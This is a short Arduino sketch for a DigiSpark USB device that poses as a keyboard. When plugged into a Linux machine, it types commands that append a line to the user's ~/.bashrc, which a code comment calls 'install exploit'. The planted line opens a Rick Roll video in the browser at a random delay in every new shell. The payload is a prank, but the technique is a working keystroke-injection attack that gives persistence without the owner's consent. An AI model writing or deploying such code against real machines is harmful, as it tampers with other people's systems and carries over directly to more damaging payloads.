#include "DigiKeyboard.h"

#define ANNOYANCE_LEVEL 600
#define RICK_ROLL_LINK "https://archive.org/details/never-gonna-give-you-up-edit-wvm7gv"
#define RICK_ROLL_COMMAND "sleep $(( $RANDOM % " ANNOYANCE_LEVEL " )) && x-www-browser " RICK_ROLL_LINK " &"

void write(const char* msg) {

  // for some reason, some keystrokes seen to be lost at the beginning,
  // so we add some delay here
  DigiKeyboard.delay(150);
  DigiKeyboard.println(msg);
}

void setup() {

  // lights on -> script running
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);

  // add some delay to avoid probles
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);

  // change keyboad layout
  write("setxkbmap us");

  // install exploit
  write("echo \"" RICK_ROLL_COMMAND "\" >> ~/.bashrc");

  // change keyboard layout back
  write("setxkbmap br, us");

  // lights off -> script has ended
  digitalWrite(1, LOW);
  digitalWrite(0, LOW);
}

void loop() {

}
